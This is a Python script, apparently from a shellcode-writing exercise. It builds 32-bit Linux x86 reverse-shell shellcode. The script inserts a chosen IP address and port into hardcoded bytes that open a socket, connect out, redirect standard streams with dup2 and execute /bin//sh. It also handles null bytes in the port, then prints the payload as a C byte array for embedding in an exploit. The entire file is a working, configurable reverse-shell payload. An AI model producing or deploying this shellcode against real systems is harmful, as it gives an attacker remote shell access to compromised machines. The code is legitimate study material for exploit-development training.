#!/usr/bin/python3

import socket
import sys


#up to but not including the IP address
shellcode = bytearray(b'\x29\xc0\x31\xdb\x29\xc9\x31\xd2\x29\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc3\x52\x52\x68')

if len(sys.argv) != 3:
	print(f"Usage: {sys.argv[0]} 127.0.0.1 4444")
	exit() 

connectIP = sys.argv[1]

# convert to bytes in network byte order
try:
	connectIPBytes = socket.inet_aton(connectIP)
except:
	print("Invalid IP address format!")
	exit()


#add IP address to our shellcode
shellcode = shellcode + connectIPBytes

connectPort = int(sys.argv[2])

if connectPort < 1 or connectPort > 0xFFFF:
	print("Invalid port value!")
	exit()

#convert the port number int to network format (i.e. big-endian) 
newPort = socket.htons(connectPort)


# separate 16-bit short into two separate integers
lowByte = newPort & 0xFF 
highByte = (newPort >> 8) & 0xFF


# if no null bytes 
if lowByte != 0 and highByte != 0:
	# pushw our port number
	shellcode = shellcode + bytearray(list((0x66, 0x68, lowByte, highByte)))
else:
	# if the low byte is 0x00, we have to move non-null byte value first (0x5c5c 
	# in our example below), shift left by 1 byte and then push 0x5c00 on the stack

	# 66 ba 5c 5c          	mov    dx,0x5c5c
	# 66 c1 e2 08          	shl    dx,0x8
	# 66 52                	push   dx
	if lowByte == 0:
		print("[Debug] Taking care of a null-byte in port number low order byte.")
		shellcode = shellcode + bytearray(list((0x66, 0xba, highByte, highByte, 0x66, 0xc1, 0xe2, 0x08, 0x66, 0x52)))
	# if the high byte is 0x00 - rotate to the right
	# 66 ba 5c 5c             mov    dx,0x5c5c
	# 66 c1 ea 08             shr    dx,0x8
	# 66 52                   push   dx
	if highByte == 0:
		print("[Debug] Taking care of a null-byte in port number high order byte.")
		shellcode = shellcode + bytearray(list((0x66, 0xba, lowByte, lowByte, 0x66, 0xc1, 0xea, 0x08, 0x66, 0x52)))

# concatenate the rest of the shellcode after we pushed the target port
shellcode = shellcode + bytearray(b'\x66\x6a\x02\x89\xe1\xb2\x10\x66\xb8\x6a\x01\xcd\x80\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x29\xc0\x50\x89\xe2\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80')

print("Payload size:", len(shellcode), 'bytes.')

# let's print out shellcode
print("unsigned char buf[] = \\")

# let's do it nicely
i = 0
for byte in shellcode:
	if i == 0:
		print("\"", end='')
	print('\\x{:02x}'.format(byte), end='')
	i += 1
	if i == 15:
		i = 0
		print("\"")

if i == 15:
	print(";")
else:
	print("\";")
